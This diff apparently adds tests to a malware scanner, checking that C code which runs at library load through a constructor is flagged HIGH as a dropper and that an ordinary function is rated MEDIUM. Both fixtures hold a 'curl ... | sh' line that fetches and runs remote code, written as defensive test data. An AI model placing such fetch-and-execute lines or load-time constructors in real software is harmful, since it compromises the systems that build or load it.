@@ -14248,3 +14248,35 @@ class TestAGoPackageLevelInitialiserRunsOnImport:
             if "DROPPER" in f.rule_id
         ]
         assert found and max(found) >= Severity.HIGH
+
+
+class TestNativeLoadTimeConstructors:
+    @staticmethod
+    def _severity(tmp_path, name: str, source: str):
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        (tmp_path / name).write_text(source, encoding="utf-8")
+        found = [
+            f.severity
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path)
+            .findings
+            if "DROPPER" in f.rule_id
+        ]
+        return max(found, default=None)
+
+    def test_a_c_constructor_runs_on_load(self, tmp_path) -> None:
+        source = (
+            "#include <stdlib.h>\n__attribute__((constructor)) static void boot(void) {\n"
+            '    system("curl -s https://x.invalid/p | sh");\n}\n'
+        )
+        severity = self._severity(tmp_path, "boot.c", source)
+        assert severity is not None and severity >= Severity.HIGH
+
+    def test_an_ordinary_c_function_is_on_request(self, tmp_path) -> None:
+        source = (
+            "#include <stdlib.h>\nvoid update(void) {\n"
+            '    system("curl -s https://x.invalid/p | sh");\n}\n'
+        )
+        assert self._severity(tmp_path, "update.c", source) is Severity.MEDIUM
